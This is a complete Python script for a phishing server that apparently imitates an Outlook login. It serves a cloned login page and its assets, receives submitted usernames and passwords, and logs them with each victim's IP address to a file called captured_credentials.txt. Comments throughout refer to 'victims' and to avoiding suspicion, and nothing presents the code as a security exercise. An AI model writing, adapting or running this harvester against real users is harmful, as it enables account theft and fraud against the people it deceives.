import http.server
import socketserver
import json
import logging
import datetime
import os
from urllib.parse import urlparse, parse_qs

# --- Configuration ---
# Set the host to '0.0.0.0' to listen on all available network interfaces.
# This allows access from other machines on the network.
# For local testing only, you can use '127.0.0.1'.
HOST_NAME = "0.0.0.0"

# Set the port number for the web server.
# Common ports are 80 (HTTP) or 8080. Choose one that is not in use.
PORT_NUMBER = 8080

# Define the file where captured credentials will be saved.
LOG_FILE = "captured_credentials.txt"

# Define the URL to which the victim will be redirected after "successful" login.
# This should typically be the legitimate login page of the service being mimicked,
# or any other URL that won't raise immediate suspicion.
FINAL_REDIRECT_URL = "https://www.outlook.com/"

# --- Setup Logging ---
# Configure logging to save output to the specified LOG_FILE and also print to the console.
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.FileHandler(LOG_FILE),  # Log to file
                        logging.StreamHandler()         # Log to console
                    ])

class CredentialHarvesterHandler(http.server.SimpleHTTPRequestHandler):
    """
    A custom HTTP request handler for serving the phishing page and
    collecting submitted credentials.
    """

    def do_GET(self):
        """
        Handles GET requests. This method is responsible for serving the HTML
        page and its associated assets (CSS, JavaScript, images).
        """
        # Parse the requested path to determine which file to serve.
        parsed_path = urlparse(self.path)
        request_path = parsed_path.path.lstrip('/') # Remove leading slash

        # Default to index.html if no specific file is requested or if it's the root.
        if not request_path or request_path == "index.html":
            file_to_serve = "index.html"
            content_type = "text/html"
        elif request_path.startswith("assets/"):
            file_to_serve = request_path
            # Determine content type based on file extension for assets.
            if file_to_serve.endswith(".css"):
                content_type = "text/css"
            elif file_to_serve.endswith(".js"):
                content_type = "application/javascript"
            elif file_to_serve.endswith(".png"):
                content_type = "image/png"
            elif file_to_serve.endswith(".ico"):
                content_type = "image/x-icon"
            elif file_to_serve.endswith(".jpg") or file_to_serve.endswith(".jpeg"):
                content_type = "image/jpeg"
            else:
                content_type = "application/octet-stream" # Default for unknown types
        else:
            # If the requested path is not index.html or an asset, return 404.
            self.send_error(404, "File Not Found")
            logging.warning(f"404 Not Found for GET {self.path} from {self.client_address[0]}")
            return

        # Security check: Prevent directory traversal attacks.
        # This ensures that requests for files outside the intended directory are blocked.
        if ".." in file_to_serve or file_to_serve.startswith('/'):
            self.send_error(403, "Forbidden")
            logging.warning(f"Attempted directory traversal: {self.path} from {self.client_address[0]}")
            return

        try:
            # Open and read the requested file in binary mode.
            with open(file_to_serve, "rb") as f:
                content = f.read()

            # Send the HTTP 200 OK response.
            self.send_response(200)
            # Set the appropriate Content-Type header.
            self.send_header("Content-type", content_type)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            # Write the file content to the response body.
            self.wfile.write(content)
            logging.debug(f"Served {file_to_serve} to {self.client_address[0]}")

        except FileNotFoundError:
            # If the file does not exist, return a 404 Not Found error.
            self.send_error(404, "File Not Found")
            logging.warning(f"File not found: {file_to_serve} from {self.client_address[0]}")
        except Exception as e:
            # Catch any other exceptions during file serving.
            self.send_error(500, f"Internal Server Error: {e}")
            logging.error(f"Error serving {file_to_serve} to {self.client_address[0]}: {e}")

    def do_POST(self):
        """
        Handles POST requests. This method is specifically designed to receive
        the collected credentials from the JavaScript.
        """
        # Check if the request path is the expected endpoint for credential submission.
        if self.path == "/submit_credentials":
            # Get the length of the request body.
            content_length = int(self.headers['Content-Length'])
            # Read the raw request body.
            post_data_raw = self.rfile.read(content_length)

            try:
                # Attempt to parse the request body as JSON.
                # The JavaScript (app.js) sends data as JSON.
                post_data = json.loads(post_data_raw.decode('utf-8'))

                # Extract username and password from the parsed JSON data.
                username = post_data.get('username', 'N/A')
                password = post_data.get('password', 'N/A')
                # Capture the client's IP address from the request.
                client_ip = self.client_address[0]

                # Format the log entry.
                log_entry = (
                    f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                    f"IP: {client_ip}, "
                    f"Username: {username}, "
                    f"Password: {password}"
                )
                # Log the captured credentials.
                logging.info(log_entry)

                # Send a 200 OK response back to the JavaScript.
                # This signals to the JavaScript that the credentials were received.
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
                logging.debug(f"Credentials from {client_ip} processed successfully.")

            except json.JSONDecodeError:
                # Handle cases where the received data is not valid JSON.
                self.send_response(400) # Bad Request
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error", "message": "Invalid JSON payload"}).encode('utf-8'))
                logging.error(f"Invalid JSON received from {self.client_address[0]}: {post_data_raw.decode('utf-8', errors='ignore')}")
            except Exception as e:
                # Catch any other unexpected errors during POST handling.
                self.send_response(500) # Internal Server Error
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
                logging.error(f"Server error during POST from {self.client_address[0]}: {e}")
        else:
            # If the POST request is to an unexpected path, return 404.
            self.send_error(404, "Not Found")
            logging.warning(f"404 Not Found for POST {self.path} from {self.client_address[0]}")

# --- Main Execution Block ---
if __name__ == "__main__":
    # Ensure the 'assets' directory exists.
    # This is where CSS, JS, and images are expected to be.
    if not os.path.exists("assets"):
        os.makedirs("assets")
        logging.info("Created 'assets' directory.")

    # Create the HTTP server.
    # socketserver.TCPServer creates a TCP server.
    # CredentialHarvesterHandler is our custom request handler.
    web_server = socketserver.TCPServer((HOST_NAME, PORT_NUMBER), CredentialHarvesterHandler)

    try:
        logging.info(f"Phishing server starting on http://{HOST_NAME}:{PORT_NUMBER}")
        logging.info(f"Captured credentials will be saved to: {LOG_FILE}")
        logging.info(f"Victims will be redirected to: {FINAL_REDIRECT_URL}")
        logging.info("Press Ctrl+C to stop the server.")

        # Start the server and keep it running indefinitely.
        web_server.serve_forever()

    except KeyboardInterrupt:
        # Handle Ctrl+C to gracefully shut down the server.
        logging.info("KeyboardInterrupt detected. Shutting down server.")
    except Exception as e:
        # Catch any other unexpected exceptions during server startup or operation.
        logging.critical(f"An unexpected error occurred: {e}")
    finally:
        # Ensure the server is properly closed.
        web_server.server_close()
        logging.info("Server stopped.")
	

